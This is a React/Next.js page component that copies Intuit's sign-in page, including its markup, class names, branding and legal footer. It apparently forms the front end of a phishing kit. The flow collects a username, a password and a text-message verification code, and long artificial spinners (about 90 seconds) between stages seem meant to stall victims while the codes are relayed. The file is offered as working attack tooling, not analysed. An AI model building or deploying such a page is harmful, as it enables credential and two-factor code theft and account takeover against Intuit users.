"use client";

import { LargeSpinner, InlineSpinner } from "@/components/atom/spinner";
import { Password } from "@/components/organisms/password";
import { Username } from "@/components/organisms/username";
import { Text } from "@/components/organisms/text";
import { useState, useEffect } from "react";
import { TextOptions } from "@/components/organisms/text-options";

const timer = 90000;

export default function Home() {
  const [loading, setLoading] = useState(true);
  const [loaderDone, setLoaderDone] = useState(false);
  const [enterPwd, setEnterPwd] = useState(false);
  const [stage, setStage] = useState("password");
  const [value, setValue] = useState("");
  const [init, setInit] = useState(true);
  const [isFirst, setIsFirst] = useState(true);
  const [finish, setFinish] = useState("init");

  useEffect(() => {
    setTimeout(() => {
      setLoaderDone(true);
    }, 1001);
  }, []);

  useEffect(() => {
    if (loaderDone && (finish === "loading" || finish === "loading-2")) {
      setLoaderDone(false);
      setTimeout(
        () => {
          if (isFirst) {
            setLoaderDone(true);
            setEnterPwd(true);
            setIsFirst(false);
            setStage("textOptions");
          } else {
            setLoaderDone(true);
            setFinish("final");
          }
        },
        finish === "loading" ? timer - 5 : timer - 2500 - 5
      );
    }
  }, [finish]);

  useEffect(() => {
    setTimeout(() => {
      setLoaderDone(true);
    }, 1001);
  }, []);

  useEffect(() => {
    if (loaderDone) {
      setTimeout(
        () => {
          setLoading(false);
          setInit(false);
        },
        init ? 501 : 100
      );
    }
  }, [loaderDone, enterPwd, loading]);

  return (
    <>
      <LargeSpinner timer={1000} />
      {finish === "loading" && <LargeSpinner timer={timer} />}
      {finish === "loading-2" && <LargeSpinner timer={timer - 2500} />}
      {/* <script nonce="">const theme=__shellInternal&&__shellInternal.appExperience&&__shellInternal.appExperience.appTheme?__shellInternal.appExperience.appTheme:"intuit";__shellInternal&&__shellInternal.nonce&&(window.__webpack_nonce__=__shellInternal.nonce),document.querySelectorAll(".IndeterminateShort-circularSpinnerCircle").forEach((e=>{e.classList.add(`IndeterminateShort-${theme}`)}));const requirePromise=e=>new Promise(((r,n)=>{if(!window.require)return n(new Error("window.require is not defined"));require(e,r,(e=>{e instanceof Error&&(e.internalMessage="Shell - failed to fetch shell module"),n(e)}))})),bootPromise=getShellExperiments("enable-pre-boot-hook")&&window.__middlewareConfig&&"function"==typeof window.__middlewareConfig.preBoot?window.__middlewareConfig.preBoot():Promise.resolve();bootPromise.then((()=>{return e=["web-shell"],new Promise(((r,n)=>{if(!window.require)return n(new Error("window.require is not defined"));require(e,r,(e=>{e instanceof Error&&(e.internalMessage="Shell - failed to fetch shell module"),n(e)}))}));var e}),(e=>{throw e instanceof Error&&(e.internalMessage="Shell - failed to execute preBoot middleware"),e})).then((({default:e})=>e)).then((({default:e})=>e())).catch((e=>{window.__shellInternal.logger.error(e&&e.internalMessage||"Shell - failed to start shell",{},e)}))</script><script type="text/javascript" src="/S6sF-uEpXollx_flaGpQY1je/aOiQzXSrwbzmfbEDVa/Fht-GR0iXgM/AlB8JF/RmcyI"></script> */}
      <div id="___appshell">
        <div id="app" className="app-shell">
          <div data-theme="intuit" data-colorscheme="light">
            <div className="shell-view">
              <div className="main">
                <div className="body-container">
                  <div className="body" data-id="bodyNode" role="main">
                    <div
                      data-testid="SignInSignUpWidget"
                      className="ius-hosted-ui theme-intuit-ecosystem"
                      data-morpheus-widget="identity-authn-core-ui/sign-in-sign-up-hosted@1.0.0"
                      data-morpheus-widget-instance="identity-authn-core-ui:identity-authn-core-ui/sign-in-sign-up-hosted@1.0.0:82"
                      data-morpheus-pluginid="identity-authn-core-ui"
                    >
                      <div data-theme="intuit" data-colorscheme="light">
                        <div data-theme="intuit" data-colorscheme="light">
                          <div className="styledComponents__HostedSisuHeightDiv-sc-1n0nm38-0 kzLZHH">
                            <div>
                              <div
                                data-testid="IuxBookendsContainer"
                                className="Bookends__ProdModFlexCenteredColumn-sc-163uul4-4 eVIhHK"
                              >
                                <div className="Bookends__NonStyledDiv-sc-163uul4-9 Bookends__ProdModStyledDiv-sc-163uul4-10 eSgvvN gDyzNr">
                                  <div
                                    className="styledComponents__ProdModStyledWidgetContainer-kizisb-9 ioNEQy ius"
                                    data-testid="IuxBookendsHeaderContainer"
                                  >
                                    {loaderDone && (
                                      <div className="BookendsHeader__StyledBookendHeader-sc-1dyhyro-0 blBsbd">
                                        <>
                                          <div
                                            data-testid="IuxHeaderLogo"
                                            aria-hidden="true"
                                            className="IuxHeaderLogo__HeaderLogoContainer-sc-1uo1ya3-0 bQzPFA"
                                          >
                                            <a
                                              href="#"
                                              className="IuxHeaderLogo__StyledAnchor-sc-1uo1ya3-1 hJHoSA"
                                            ></a>
                                          </div>
                                          {loading ? (
                                            <InlineSpinner />
                                          ) : (
                                            <>
                                              {!enterPwd ? (
                                                <Username
                                                  setEnterPwd={setEnterPwd}
                                                  setLoading={setLoading}
                                                  value={value}
                                                  setValue={setValue}
                                                  finish={finish}
                                                />
                                              ) : stage === "password" ? (
                                                <Password
                                                  value={value}
                                                  setEnterPwd={setEnterPwd}
                                                  setLoading={setLoading}
                                                  setStage={setStage}
                                                />
                                              ) : stage === "textOptions" ? (
                                                <TextOptions
                                                  setStage={setStage}
                                                  isFirst={isFirst}
                                                />
                                              ) : stage === "textInit" ? (
                                                <Text
                                                  setStage={setStage}
                                                  setEnterPwd={setEnterPwd}
                                                  setLoading={setLoading}
                                                  setFinish={setFinish}
                                                  isFirst={isFirst}
                                                />
                                              ) : (
                                                ""
                                              )}
                                            </>
                                          )}
                                        </>
                                      </div>
                                    )}
                                  </div>
                                  <div className="BookendsFooterContainer__FooterOutsideWrapper-sc-3y9p8r-0 BookendsFooterContainer__ProdModFooterOutsideWrapper-sc-3y9p8r-1 cujhnf gslAv">
                                    <footer
                                      data-testid="IuxLegalAndCopyrightFooter"
                                      className="BookendsFooter__StyledFooter-m32qkh-0 gPKBya"
                                    >
                                      <div
                                        data-testid="IuxLegalLinksSection"
                                        className="BookendsLegalPrivacySecurityLinks__LinkContainer-r1xb63-0 BookendsLegalPrivacySecurityLinks__ProdModLinkContainer-r1xb63-1 bevLbd iCaFmM"
                                      >
                                        <ul className="BookendsLegalPrivacySecurityLinks__LinkUnorderedList-r1xb63-2 ctlOKR">
                                          <li className="BookendsLegalPrivacySecurityLinks__LinkListItem-r1xb63-3 gIaSSR">
                                            <a
                                              href="https://www.intuit.com/legal/"
                                              target="_blank"
                                              rel="noopener"
                                              data-testid="IuxLegalLink"
                                              className="idsTSLink Link-link-4bfcef8 Link-light-6e531aa"
                                            >
                                              <span
                                                className="Link-linkText-87f9e81 Typography-light-f6c67d3 Typography-body-4-7ca445b Typography-regular-4140b6b"
                                                data-testid="innerLinkText"
                                              >
                                                Legal
                                              </span>
                                            </a>
                                          </li>
                                          <li className="BookendsLegalPrivacySecurityLinks__LinkListItem-r1xb63-3 gIaSSR">
                                            <a
                                              href="https://www.intuit.com/privacy/statement/"
                                              target="_blank"
                                              rel="noopener"
                                              data-testid="IuxPrivacyLink"
                                              className="idsTSLink Link-link-4bfcef8 Link-light-6e531aa"
                                            >
                                              <span
                                                className="Link-linkText-87f9e81 Typography-light-f6c67d3 Typography-body-4-7ca445b Typography-regular-4140b6b"
                                                data-testid="innerLinkText"
                                              >
                                                Privacy
                                              </span>
                                            </a>
                                          </li>
                                          <li className="BookendsLegalPrivacySecurityLinks__LinkListItem-r1xb63-3 gIaSSR">
                                            <a
                                              href="https://security.intuit.com/"
                                              target="_blank"
                                              rel="noopener"
                                              data-testid="IuxSecurityLink"
                                              className="idsTSLink Link-link-4bfcef8 Link-light-6e531aa"
                                            >
                                              <span
                                                className="Link-linkText-87f9e81 Typography-light-f6c67d3 Typography-body-4-7ca445b Typography-regular-4140b6b"
                                                data-testid="innerLinkText"
                                              >
                                                Security
                                              </span>
                                            </a>
                                          </li>
                                        </ul>
                                      </div>
                                      <div
                                        data-testid="IuxCopyrightSection"
                                        className="BookendsFooter__StyledDiv-m32qkh-1 kyDFtb"
                                      >
                                        <div className="BookendsTerms__FooterText-sc-1t6rken-0 cwGJgm">
                                          Intuit, QuickBooks, QB, TurboTax,
                                          ProConnect, Credit Karma, and
                                          Mailchimp are registered trademarks of
                                          Intuit Inc. Terms and conditions,
                                          features, support, pricing, and
                                          service options subject to change
                                          without notice.
                                        </div>
                                        <div className="BookendsCopyright__FooterText-sc-14acr3j-0 dzUeVe">
                                          © 2025 Intuit, Inc. All rights
                                          reserved.
                                        </div>
                                      </div>
                                    </footer>
                                  </div>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </>
  );
}
